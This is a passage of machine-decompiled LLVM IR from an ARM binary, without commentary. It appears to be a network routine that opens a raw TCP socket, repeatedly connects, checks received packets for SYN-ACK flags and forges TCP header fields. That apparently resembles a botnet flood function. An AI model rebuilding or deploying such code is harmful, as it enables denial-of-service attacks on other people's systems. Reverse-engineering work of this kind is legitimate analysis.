  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b820 = load i32, i32* @r4, align 4
  store i32 %v0_b820, i32* %r0.global-to-local, align 4
  %v5_b828 = inttoptr i32 %v0_b814 to i32*
  %v6_b828 = call i32 @function_a4e8(i32 %v0_b820, i32* %v5_b828, i32 12, i32 1)
  %v1_b830 = urem i32 %v6_b828, 256
  store i32 %v1_b830, i32* %ip.global-to-local, align 4
  %v0_b834 = load i32, i32* @r5, align 4
  store i32 %v0_b834, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b840 = load i32, i32* @r4, align 4
  store i32 %v0_b840, i32* %r0.global-to-local, align 4
  %v5_b848 = inttoptr i32 %v0_b834 to i32*
  %v6_b848 = call i32 @function_a4e8(i32 %v0_b840, i32* %v5_b848, i32 13, i32 1)
  %v1_b850 = urem i32 %v6_b848, 256
  store i32 %v1_b850, i32* %ip.global-to-local, align 4
  %v0_b854 = load i32, i32* @r5, align 4
  store i32 %v0_b854, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b860 = load i32, i32* @r4, align 4
  store i32 %v0_b860, i32* %r0.global-to-local, align 4
  %v5_b868 = inttoptr i32 %v0_b854 to i32*
  %v6_b868 = call i32 @function_a4e8(i32 %v0_b860, i32* %v5_b868, i32 14, i32 0)
  %v1_b870 = urem i32 %v6_b868, 256
  store i32 %v1_b870, i32* %ip.global-to-local, align 4
  %v0_b874 = load i32, i32* @r5, align 4
  store i32 %v0_b874, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b880 = load i32, i32* @r4, align 4
  store i32 %v0_b880, i32* %r0.global-to-local, align 4
  %v5_b888 = inttoptr i32 %v0_b874 to i32*
  %v6_b888 = call i32 @function_a4e8(i32 %v0_b880, i32* %v5_b888, i32 15, i32 0)
  %v1_b890 = urem i32 %v6_b888, 256
  store i32 %v1_b890, i32* %ip.global-to-local, align 4
  %v0_b894 = load i32, i32* @r5, align 4
  store i32 %v0_b894, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b8a0 = load i32, i32* @r4, align 4
  store i32 %v0_b8a0, i32* %r0.global-to-local, align 4
  %v5_b8a8 = inttoptr i32 %v0_b894 to i32*
  %v6_b8a8 = call i32 @function_a4e8(i32 %v0_b8a0, i32* %v5_b8a8, i32 16, i32 0)
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v6_b8a8, i32* %ip.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b8b8 = load i32, i32* @r5, align 4
  store i32 %v0_b8b8, i32* %r1.global-to-local, align 4
  %v0_b8bc = load i32, i32* @r4, align 4
  store i32 %v0_b8bc, i32* %r0.global-to-local, align 4
  %v1_b8c0 = urem i32 %v6_b8a8, 256
  store i32 %v1_b8c0, i32* @r8, align 4
  %v4_b8c4 = inttoptr i32 %v0_b8b8 to i32*
  %v5_b8c4 = call i32 @function_a4e8(i32 %v0_b8bc, i32* %v4_b8c4, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b8d0 = load i32, i32* @r5, align 4
  store i32 %v0_b8d0, i32* %r1.global-to-local, align 4
  store i32 %v5_b8c4, i32* @sb, align 4
  %v0_b8d8 = load i32, i32* @r4, align 4
  store i32 %v0_b8d8, i32* %r0.global-to-local, align 4
  %v4_b8dc = inttoptr i32 %v0_b8d0 to i32*
  %v5_b8dc = call i32 @function_a4e8(i32 %v0_b8d8, i32* %v4_b8dc, i32 1, i32 1)
  store i32 3, i32* %r1.global-to-local, align 4
  %v1_b8e8 = urem i32 %v5_b8dc, 256
  store i32 %v1_b8e8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b8f8 = call i32 @function_13f90(i32 2, i32 3, i32 6)
  store i32 %v3_b8f8, i32* %r0.global-to-local, align 4
  %v0_b8fc = load i32, i32* @r7, align 4
  %v3_b8fc = udiv i32 %v0_b8fc, 65536
  store i32 %v3_b8fc, i32* %r1.global-to-local, align 4
  %v7_b900 = icmp eq i32 %v3_b8f8, -1
  store i1 %v7_b900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b900, label %dec_label_pc_bb5c, label %dec_label_pc_b910

dec_label_pc_b910:                                ; preds = %dec_label_pc_b728
  store i32 1, i32* %stack_var_-40, align 4
  %v6_b918 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_b918, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_b92c = call i32 @function_13f60(i32 %v3_b8f8, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_b92c, i32* %r0.global-to-local, align 4
  %v7_b930 = icmp eq i32 %v6_b92c, -1
  store i1 %v7_b930, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b930, label %dec_label_pc_bb54, label %dec_label_pc_b938

dec_label_pc_b938:                                ; preds = %dec_label_pc_b910
  %v0_b938 = load i32, i32* @fp, align 4
  %v2_b938 = icmp eq i32 %v0_b938, 0
  store i1 %v2_b938, i1* %cpsr_z.global-to-local, align 1
  %v0_b93c = load i32, i32* @r6, align 4
  %v3_b93c = mul i32 %v0_b93c, 65536
  store i32 %v3_b93c, i32* %r0.global-to-local, align 4
  %v3_b940 = urem i32 %v0_b93c, 65536
  store i32 %v3_b940, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp72 = icmp slt i32 %v0_b938, 1
  br i1 %tmp72, label %.thread18, label %dec_label_pc_b964.preheader

.thread18:                                        ; preds = %dec_label_pc_b938
  store i32 0, i32* %stack_var_-40, align 4
  br label %dec_label_pc_bde8

dec_label_pc_b964.preheader:                      ; preds = %dec_label_pc_b938
  %v5_b948 = load i32, i32* @r7, align 4
  %v8_b948 = udiv i32 %v5_b948, 16777216
  %tmp73 = udiv i32 %v0_b93c, 256
  %v8_b94c = urem i32 %tmp73, 256
  store i32 %v8_b94c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v3_ba50 = icmp ugt i32 %v0_b8fc, -65537
  %v2_ba74 = ptrtoint i32* %stack_var_-60 to i32
  %v3_ba80 = bitcast i32* %stack_var_-60 to %sockaddr*
  %v2_bab0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_bab4 = ptrtoint i32* %stack_var_-44 to i32
  %v2_bab8 = ptrtoint i32* %stack_var_-332 to i32
  %v4_bb04 = zext i8 %tmp31 to i32
  %v4_bb08 = zext i8 %tmp30 to i32
  %v4_bb14 = mul nuw nsw i32 %v4_bb08, 256
  %v4_bb24 = zext i8 %tmp to i32
  %v1_bb28 = and i32 %v4_bb24, 18
  %v2_bb2c = icmp eq i32 %v1_bb28, 18
  %v1_ba60 = mul nuw nsw i32 %v3_b8fc, 256
  %v4_ba64 = and i32 %v1_ba60, 65280
  %v5_ba64 = or i32 %v8_b948, %v4_ba64
  %v3_ba6893 = udiv i32 %v4_ba64, 256
  %v1_ba6c = trunc i32 %v3_ba6893 to i8
  %v1_bc30 = mul i32 %v0_b93c, 256
  %v4_bc38 = and i32 %v1_bc30, 65280
  %sext = mul i32 %v6_b770, 16777216
  %v4_bc48 = sdiv i32 %sext, 16777216
  %sext5 = mul i32 %v5_b7ac, 16777216
  %v4_bc6c = sdiv i32 %sext5, 16777216
  %v5_bb14 = or i32 %v4_bb04, %v4_bb14
  %v1_bb34 = and i32 %v4_bb24, 5
  %v2_bb34 = icmp eq i32 %v1_bb34, 0
  %v1_ba70 = trunc i32 %v8_b948 to i8
  %v5_bc38 = or i32 %v8_b94c, %v4_bc38
  %v1_bc58 = trunc i32 %v4_bc48 to i8
  %v1_bd38 = urem i32 %v5_b808, 2
  %tmp94 = sub nsw i32 0, %v1_bd38
  %v4_bd40 = and i32 %tmp94, 32
  %v1_bd50 = urem i32 %v6_b828, 2
  %tmp95 = sub nsw i32 0, %v1_bd50
  %v4_bd58 = and i32 %tmp95, 16
  %v1_bd68 = urem i32 %v6_b848, 2
  %tmp96 = sub nsw i32 0, %v1_bd68
  %v4_bd70 = and i32 %tmp96, 8
  %v1_bd80 = urem i32 %v6_b868, 2
  %tmp97 = sub nsw i32 0, %v1_bd80
  %v4_bd88 = and i32 %tmp97, 4
  %v1_bd98 = urem i32 %v6_b888, 2
  %tmp98 = sub nsw i32 0, %v1_bd98
  %v3_bda0 = and i32 %tmp98, 2
  br label %dec_label_pc_b964

dec_label_pc_b964:                                ; preds = %dec_label_pc_bdd4, %dec_label_pc_bb3c, %dec_label_pc_b964.preheader
  store i32 %v8_b94c, i32* %r3.global-to-local, align 4
  %v0_b970 = load i32, i32* @sb, align 4
  %v1_b970 = add i32 %v0_b970, 40
  store i32 %v1_b970, i32* @sl, align 4
  br label %dec_label_pc_b974

dec_label_pc_b974:                                ; preds = %dec_label_pc_bb48, %dec_label_pc_b964
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b980 = call i32 @function_13f90(i32 2, i32 1, i32 0)
  store i32 %v3_b980, i32* %r0.global-to-local, align 4
  %v7_b984 = icmp eq i32 %v3_b980, -1
  store i1 %v7_b984, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b980, i32* @r7, align 4
  br i1 %v7_b984, label %dec_label_pc_bdd4, label %dec_label_pc_b990

dec_label_pc_b990:                                ; preds = %dec_label_pc_b974
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b998 = call i32 @function_135ac(i32 %v3_b980, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b9a0 = or i32 %v2_b998, 2048
  store i32 %v1_b9a0, i32* @r2, align 4
  %v0_b9a4 = load i32, i32* @r7, align 4
  store i32 %v0_b9a4, i32* %r0.global-to-local, align 4
  %v2_b9a8 = call i32 @function_135ac(i32 %v0_b9a4, i32 4)
  store i32 %v2_b9a8, i32* %r0.global-to-local, align 4
  %v3_b9ac = load i32, i32* %stack_var_-40, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_b9bc = mul i32 %v3_b9ac, 24
  store i32 %v5_b9bc, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  %v2_b9cc = add i32 %v5_b9bc, %arg2
  store i32 %v2_b9cc, i32* %r2.global-to-local, align 4
  %v1_b9d0 = add i32 %v2_b9cc, 20
  %v2_b9d0 = inttoptr i32 %v1_b9d0 to i8*
  %v3_b9d0 = load i8, i8* %v2_b9d0, align 1
  %v4_b9d0 = zext i8 %v3_b9d0 to i32
  store i32 %v4_b9d0, i32* %r3.global-to-local, align 4
  %v2_b9d4 = icmp ugt i8 %v3_b9d0, 30
  %v7_b9d4 = icmp eq i8 %v3_b9d0, 31
  store i1 %v7_b9d4, i1* %cpsr_z.global-to-local, align 1
  %v2_b9d8 = xor i1 %v7_b9d4, true
  %v3_b9d8 = and i1 %v2_b9d4, %v2_b9d8
  %v5_b9d8 = add i32 %v2_b9cc, 16
  %v6_b9d8 = inttoptr i32 %v5_b9d8 to i32*
  %v7_b9d8 = load i32, i32* %v6_b9d8, align 4
  br i1 %v3_b9d8, label %dec_label_pc_ba44, label %dec_label_pc_b9e4

dec_label_pc_b9e4:                                ; preds = %dec_label_pc_b990
  store i32 %v7_b9d8, i32* @r4, align 4
  %v0_b9e8 = call i32 @function_fe60()
  store i32 %v0_b9e8, i32* %r0.global-to-local, align 4
  %v3_b9ec = load i32, i32* %stack_var_-40, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v5_b9f8 = mul i32 %v3_b9ec, 24
  %v0_b9fc = load i32, i32* @r4, align 4
  %v2_ba00 = add i32 %v5_b9f8, %arg2
  store i32 %v2_ba00, i32* %r1.global-to-local, align 4
  %v1_ba04 = and i32 %v0_b9fc, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_ba04, i32* %r3.global-to-local, align 4
  %v1_b9fc = udiv i32 %v0_b9fc, 256
  %v3_ba08 = and i32 %v1_b9fc, 65280
  store i32 %v3_ba08, i32* %r2.global-to-local, align 4
  %v3_ba0c = mul i32 %v0_b9fc, 16777216
  store i32 %v3_ba0c, i32* %ip.global-to-local, align 4
  %v1_ba10 = add i32 %v2_ba00, 20
  %v2_ba10 = inttoptr i32 %v1_ba10 to i8*
  %v3_ba10 = load i8, i8* %v2_ba10, align 1
  %v4_ba10 = zext i8 %v3_ba10 to i32
  store i32 %v4_ba10, i32* %lr.global-to-local, align 4
  %v4_ba14 = mul i32 %v1_ba04, 256
  %v5_ba14 = or i32 %v4_ba14, %v3_ba0c
  store i32 %v5_ba14, i32* %ip.global-to-local, align 4
  %v4_ba18 = udiv i32 %v0_b9fc, 16777216
  %v5_ba18 = or i32 %v3_ba08, %v4_ba18
  %v2_ba1c = or i32 %v5_ba18, %v5_ba14
  %v7_ba20 = lshr i32 %v0_b9e8, %v4_ba10
  %v8_ba20 = add i32 %v7_ba20, %v2_ba1c
  store i32 %v8_ba20, i32* %r2.global-to-local, align 4
  %v3_ba2c = mul i32 %v8_ba20, 16777216
  %v1_ba30 = and i32 %v8_ba20, 65280
  store i32 %v1_ba30, i32* %r0.global-to-local, align 4
  %v4_ba34 = mul nuw nsw i32 %v1_ba30, 256
  %v5_ba34 = or i32 %v4_ba34, %v3_ba2c
  store i32 %v5_ba34, i32* %r1.global-to-local, align 4
  %v2_ba3c = call i32 @llvm.bswap.i32(i32 %v8_ba20)
  br label %dec_label_pc_ba44

dec_label_pc_ba44:                                ; preds = %dec_label_pc_b990, %dec_label_pc_b9e4
  %storemerge25 = phi i32 [ %v2_ba3c, %dec_label_pc_b9e4 ], [ %v7_b9d8, %dec_label_pc_b990 ]
  store i32 %v3_b8fc, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_ba50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ba50, label %dec_label_pc_bb64, label %dec_label_pc_ba58

dec_label_pc_ba58:                                ; preds = %dec_label_pc_ba44
  store i32 %v8_b948, i32* %ip.global-to-local, align 4
  store i32 %v5_ba64, i32* %r3.global-to-local, align 4
  store i32 %v3_ba6893, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ba74

dec_label_pc_ba74:                                ; preds = %dec_label_pc_bb64, %dec_label_pc_ba58
  %stack_var_-57.0 = phi i8 [ %v1_bb6c, %dec_label_pc_bb64 ], [ %v1_ba6c, %dec_label_pc_ba58 ]
  %storemerge = phi i8 [ %v1_bb64, %dec_label_pc_bb64 ], [ %v1_ba70, %dec_label_pc_ba58 ]
  store i32 %v2_ba74, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_ba7c = load i32, i32* @r7, align 4
  store i32 %v0_ba7c, i32* %r0.global-to-local, align 4
  %v4_ba80 = call i32 @function_13dec(i32 %v0_ba7c, %sockaddr* nonnull %v3_ba80, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_ba88 = call i32 @function_1396c(i32* null)
  store i32 %v2_ba88, i32* %r0.global-to-local, align 4
  store i32 %v2_ba88, i32* @r4, align 4
  %v9_bae8 = icmp eq i32 %tmp32, %storemerge25
  %v4_bb0c = zext i8 %storemerge to i32
  %v4_bb10 = zext i8 %stack_var_-57.0 to i32
  %. = zext i1 %v9_bae8 to i32
  %v9_bafc = icmp eq i1 %v9_bae8, false
  %v4_bb18 = mul nuw nsw i32 %v4_bb10, 256
  %v5_bb18 = or i32 %v4_bb18, %v4_bb0c
  %v9_bb1c = icmp eq i32 %v5_bb18, %v5_bb14
  br label %dec_label_pc_baa4

dec_label_pc_ba94:                                ; preds = %.thread23, %dec_label_pc_bb04, %dec_label_pc_bb34, %bb75
  %v2_ba94 = call i32 @function_1396c(i32* null)
  %v0_ba98 = load i32, i32* @r4, align 4
  %v2_ba98 = sub i32 %v2_ba94, %v0_ba98
  store i32 %v2_ba98, i32* %r0.global-to-local, align 4
  %v7_ba9c = icmp eq i32 %v2_ba98, 10
  store i1 %v7_ba9c, i1* %cpsr_z.global-to-local, align 1
  %v8_baa0 = icmp sgt i32 %v2_ba98, 10
  br i1 %v8_baa0, label %dec_label_pc_bb48, label %dec_label_pc_baa4

dec_label_pc_baa4:                                ; preds = %dec_label_pc_ba94, %dec_label_pc_ba74
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-44, align 4
  store i32 %v2_bab0, i32* %lr.global-to-local, align 4
  store i32 %v2_bab4, i32* %ip.global-to-local, align 4
  store i32 %v2_bab8, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_b8f8, i32* %r0.global-to-local, align 4
  %v7_bacc = call i32 @function_13ecc(i32 %v3_b8f8, i32* nonnull %stack_var_-332, i32 256, i32 16384, i32 %v2_bab0, i32 %v2_bab4)
  store i32 %v7_bacc, i32* %r2.global-to-local, align 4
  %v7_bad4 = icmp eq i32 %v7_bacc, -1
  store i1 %v7_bad4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_bad4, label %dec_label_pc_bb5c, label %dec_label_pc_bae0

dec_label_pc_bae0:                                ; preds = %dec_label_pc_baa4
  store i32 %tmp32, i32* %r3.global-to-local, align 4
  store i32 %., i32* %r1.global-to-local, align 4
  %v7_baf4 = icmp eq i32 %v7_bacc, 40
  store i1 %v7_baf4, i1* %cpsr_z.global-to-local, align 1
  %tmp99 = icmp ult i32 %v7_bacc, 41
  br i1 %tmp99, label %.thread23, label %bb75

.thread23:                                        ; preds = %dec_label_pc_bae0
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ba94

bb75:                                             ; preds = %dec_label_pc_bae0
  store i1 %v9_bafc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bafc, label %dec_label_pc_ba94, label %dec_label_pc_bb04

dec_label_pc_bb04:                                ; preds = %bb75
  store i32 %v4_bb08, i32* %r1.global-to-local, align 4
  store i32 %v4_bb0c, i32* %ip.global-to-local, align 4
  store i32 %v4_bb10, i32* %r2.global-to-local, align 4
  store i32 %v5_bb14, i32* %r3.global-to-local, align 4
  store i32 %v5_bb18, i32* @r5, align 4
  store i1 %v9_bb1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bb1c, label %dec_label_pc_bb24, label %dec_label_pc_ba94

dec_label_pc_bb24:                                ; preds = %dec_label_pc_bb04
  store i32 %v4_bb24, i32* %r2.global-to-local, align 4
  store i32 %v1_bb28, i32* %r3.global-to-local, align 4
  store i1 %v2_bb2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bb2c, label %dec_label_pc_bb78, label %dec_label_pc_bb34

dec_label_pc_bb34:                                ; preds = %dec_label_pc_bb24
  store i1 %v2_bb34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bb34, label %dec_label_pc_ba94, label %dec_label_pc_bb3c

dec_label_pc_bb3c:                                ; preds = %dec_label_pc_bb34
  %v0_bb3c = load i32, i32* @r7, align 4
  store i32 %v0_bb3c, i32* %r0.global-to-local, align 4
  %v1_bb40 = call i32 @function_1369c(i32 %v0_bb3c)
  store i32 %v1_bb40, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b964

dec_label_pc_bb48:                                ; preds = %dec_label_pc_ba94
  %v0_bb48 = load i32, i32* @r7, align 4
  store i32 %v0_bb48, i32* %r0.global-to-local, align 4
  %v1_bb4c = call i32 @function_1369c(i32 %v0_bb48)
  store i32 %v1_bb4c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b974

dec_label_pc_bb54:                                ; preds = %dec_label_pc_b910
  store i32 %v3_b8f8, i32* %r0.global-to-local, align 4
  %v1_bb58 = call i32 @function_1369c(i32 %v3_b8f8)
  store i32 %v1_bb58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bb5c

dec_label_pc_bb5c:                                ; preds = %dec_label_pc_baa4, %dec_label_pc_b728, %dec_label_pc_bb54
  %v29_bb60 = phi i32 [ %v3_b8f8, %dec_label_pc_b728 ], [ %v1_bb58, %dec_label_pc_bb54 ], [ 0, %dec_label_pc_baa4 ]
  ret i32 %v29_bb60

dec_label_pc_bb64:                                ; preds = %dec_label_pc_ba44
  %v0_bb64 = call i32 @function_fe60()
  %v1_bb64 = trunc i32 %v0_bb64 to i8
  store i32 %v0_bb64, i32* %r0.global-to-local, align 4
  %v4_bb68 = sdiv i32 %v0_bb64, 256
  store i32 %v4_bb68, i32* %r3.global-to-local, align 4
  %v1_bb6c = trunc i32 %v4_bb68 to i8
  br label %dec_label_pc_ba74

dec_label_pc_bb78:                                ; preds = %dec_label_pc_bb24
  %v3_bb78 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bb78, i32* @r4, align 4
  store i32 %v2_b748, i32* %r2.global-to-local, align 4
  %v3_bb80 = mul i32 %v3_bb78, 16
  store i32 %v3_bb80, i32* %ip.global-to-local, align 4
  %v3_bb84 = add i32 %v3_bb80, %v2_b748
  %v4_bb84 = inttoptr i32 %v3_bb84 to i32*
  store i32 %storemerge25, i32* %v4_bb84, align 4
  %v0_bb88 = load i32, i32* @r6, align 4
  %v1_bb88 = add i32 %v0_bb88, 4
  %v2_bb88 = inttoptr i32 %v1_bb88 to i32*
  %v3_bb88 = load i32, i32* %v2_bb88, align 4
  store i32 %v3_bb88, i32* %r0.global-to-local, align 4
  %v1_bb90 = and i32 %v3_bb88, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_bb90, i32* %r1.global-to-local, align 4
  store i32 %v2_b748, i32* %lr.global-to-local, align 4
  %v3_bb98 = mul i32 %v3_bb88, 16777216
  %v1_bb8c = udiv i32 %v3_bb88, 256
  %v3_bb9c = and i32 %v1_bb8c, 65280
  %v4_bba0 = mul i32 %v1_bb90, 256
  %v5_bba0 = or i32 %v4_bba0, %v3_bb98
  store i32 %v5_bba0, i32* %r2.global-to-local, align 4
  %v4_bba4 = udiv i32 %v3_bb88, 16777216
  %v5_bba4 = or i32 %v3_bb9c, %v4_bba4
  %v1_bba8 = load i32, i32* %ip.global-to-local, align 4
  %v2_bba8 = add i32 %v1_bba8, %v2_b748
  store i32 %v2_bba8, i32* %ip.global-to-local, align 4
  %v2_bbac = or i32 %v5_bba4, %v5_bba0
  store i32 %v2_bbac, i32* %r3.global-to-local, align 4
  %v2_bbb0 = add i32 %v2_bba8, 4
  %v3_bbb0 = inttoptr i32 %v2_bbb0 to i32*
  store i32 %v2_bbac, i32* %v3_bbb0, align 4
  %v0_bbb4 = load i32, i32* @r6, align 4
  %v1_bbb4 = add i32 %v0_bbb4, 8
  %v2_bbb4 = inttoptr i32 %v1_bbb4 to i32*
  %v3_bbb4 = load i32, i32* %v2_bbb4, align 4
  store i32 %v3_bbb4, i32* %r0.global-to-local, align 4
  %v1_bbbc = and i32 %v3_bbb4, ptrtoint (i32* @global_var_ff00.24 to i32)
  store i32 %v1_bbbc, i32* %r1.global-to-local, align 4
  %v3_bbc0 = mul i32 %v3_bbb4, 16777216
  %v1_bbb8 = udiv i32 %v3_bbb4, 256
  %v3_bbc4 = and i32 %v1_bbb8, 65280
  %v4_bbc8 = mul i32 %v1_bbbc, 256
  %v5_bbc8 = or i32 %v4_bbc8, %v3_bbc0
  store i32 %v5_bbc8, i32* %r2.global-to-local, align 4
  %v4_bbcc = udiv i32 %v3_bbb4, 16777216
  %v5_bbcc = or i32 %v3_bbc4, %v4_bbcc
  %v2_bbd0 = or i32 %v5_bbcc, %v5_bbc8
  store i32 %v2_bbd0, i32* %r3.global-to-local, align 4
  %v1_bbd4 = load i32, i32* %ip.global-to-local, align 4
  %v2_bbd4 = add i32 %v1_bbd4, 8
  %v3_bbd4 = inttoptr i32 %v2_bbd4 to i32*
  store i32 %v2_bbd0, i32* %v3_bbd4, align 4
  %v0_bbd8 = load i32, i32* @r6, align 4
  %v1_bbd8 = inttoptr i32 %v0_bbd8 to i32*
  %v2_bbd8 = load i32, i32* %v1_bbd8, align 4
  %v3_bbdc = udiv i32 %v2_bbd8, 65536
  store i32 %v3_bbdc, i32* %r2.global-to-local, align 4
  %v3_bbe03 = udiv i32 %v2_bbd8, 16777216
  store i32 %v3_bbe03, i32* %r1.global-to-local, align 4
  %v0_bbe4 = load i32, i32* @r5, align 4
  %v3_bbe4 = sdiv i32 %v0_bbe4, 256
  store i32 %v3_bbe4, i32* %r3.global-to-local, align 4
  %v1_bbe8 = trunc i32 %v3_bbe4 to i8
  %v2_bbe8 = load i32, i32* %ip.global-to-local, align 4
  %v3_bbe8 = add i32 %v2_bbe8, 15
  %v4_bbe8 = inttoptr i32 %v3_bbe8 to i8*
  store i8 %v1_bbe8, i8* %v4_bbe8, align 1
  %v0_bbec = load i32, i32* %r1.global-to-local, align 4
  %v1_bbec = trunc i32 %v0_bbec to i8
  %v2_bbec = load i32, i32* %ip.global-to-local, align 4
  %v3_bbec = add i32 %v2_bbec, 13
  %v4_bbec = inttoptr i32 %v3_bbec to i8*
  store i8 %v1_bbec, i8* %v4_bbec, align 1
  %v0_bbf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bbf0 = trunc i32 %v0_bbf0 to i8
  %v2_bbf0 = load i32, i32* %ip.global-to-local, align 4
  %v3_bbf0 = add i32 %v2_bbf0, 12
  %v4_bbf0 = inttoptr i32 %v3_bbf0 to i8*
  store i8 %v1_bbf0, i8* %v4_bbf0, align 1
  %v0_bbf4 = load i32, i32* @r5, align 4
  %v1_bbf4 = trunc i32 %v0_bbf4 to i8
  %v2_bbf4 = load i32, i32* %ip.global-to-local, align 4
  %v3_bbf4 = add i32 %v2_bbf4, 14
  %v4_bbf4 = inttoptr i32 %v3_bbf4 to i8*
  store i8 %v1_bbf4, i8* %v4_bbf4, align 1
  %v0_bbf8 = load i32, i32* @sl, align 4
  store i32 %v0_bbf8, i32* %r0.global-to-local, align 4
  %v1_bbfc = call i32 @function_14140(i32 %v0_bbf8)
  store i32 %v1_bbfc, i32* %r0.global-to-local, align 4
  store i32 %v2_b758, i32* %r1.global-to-local, align 4
  %v3_bc04 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bc04, i32* %r2.global-to-local, align 4
  %v2_bc08 = load i32, i32* @r4, align 4
  %v5_bc08 = mul i32 %v2_bc08, 4
  %v6_bc08 = add i32 %v5_bc08, %v2_b758
  %v7_bc08 = inttoptr i32 %v6_bc08 to i32*
  store i32 %v1_bbfc, i32* %v7_bc08, align 4
  %v0_bc0c = load i32, i32* %r1.global-to-local, align 4
  %v1_bc0c = load i32, i32* %r2.global-to-local, align 4
  %v4_bc0c = mul i32 %v1_bc0c, 4
  %v5_bc0c = add i32 %v4_bc0c, %v0_bc0c
  %v6_bc0c = inttoptr i32 %v5_bc0c to i32*
  %v7_bc0c = load i32, i32* %v6_bc0c, align 4
  store i32 %v7_bc0c, i32* @r4, align 4
  %v1_bc10 = inttoptr i32 %v7_bc0c to i8*
  %v2_bc10 = load i8, i8* %v1_bc10, align 1
  %tmp100 = urem i8 %v2_bc10, 16
  %v1_bc14 = zext i8 %tmp100 to i32
  %v1_bc18 = or i32 %v1_bc14, 64
  store i32 %v1_bc18, i32* %r3.global-to-local, align 4
  %v1_bc1c = trunc i32 %v1_bc18 to i8
  store i8 %v1_bc1c, i8* %v1_bc10, align 1
  %v0_bc20 = load i32, i32* @r4, align 4
  %v1_bc20 = inttoptr i32 %v0_bc20 to i8*
  %v2_bc20 = load i8, i8* %v1_bc20, align 1
  store i32 %v3_b940, i32* %ip.global-to-local, align 4
  %v1_bc2c = and i8 %v2_bc20, -16
  %v1_bc34 = or i8 %v1_bc2c, 5
  store i32 %v5_bc38, i32* %r0.global-to-local, align 4
  %v0_bc3c = load i32, i32* @sl, align 4
  %v3_bc3c = mul i32 %v0_bc3c, 65536
  store i32 %v3_bc3c, i32* %r2.global-to-local, align 4
  store i32 %v1_b7d8, i32* %lr.global-to-local, align 4
  store i8 %v1_bc34, i8* %v1_bc20, align 1
  store i32 %v4_bc48, i32* %r1.global-to-local, align 4
  %v0_bc4c = load i32, i32* %r2.global-to-local, align 4
  %v3_bc4c = udiv i32 %v0_bc4c, 65536
  %v1_bc50 = urem i32 %v3_bc4c, 256
  store i32 %v1_bc50, i32* %r3.global-to-local, align 4
  %v3_bc54 = udiv i32 %v0_bc4c, 16777216
  store i32 %v3_bc54, i32* %r2.global-to-local, align 4
  %v2_bc58 = load i32, i32* @r4, align 4
  %v3_bc58 = add i32 %v2_bc58, 1
  %v4_bc58 = inttoptr i32 %v3_bc58 to i8*
  store i8 %v1_bc58, i8* %v4_bc58, align 1
  %v0_bc5c = load i32, i32* %r2.global-to-local, align 4
  %v1_bc5c = load i32, i32* %r3.global-to-local, align 4
  %v4_bc5c = mul i32 %v1_bc5c, 256
  %v5_bc5c = or i32 %v4_bc5c, %v0_bc5c
  store i32 %v5_bc5c, i32* %r2.global-to-local, align 4
  %v1_bc60 = trunc i32 %v0_bc5c to i8
  %v2_bc60 = load i32, i32* @r4, align 4
  %v3_bc60 = add i32 %v2_bc60, 2
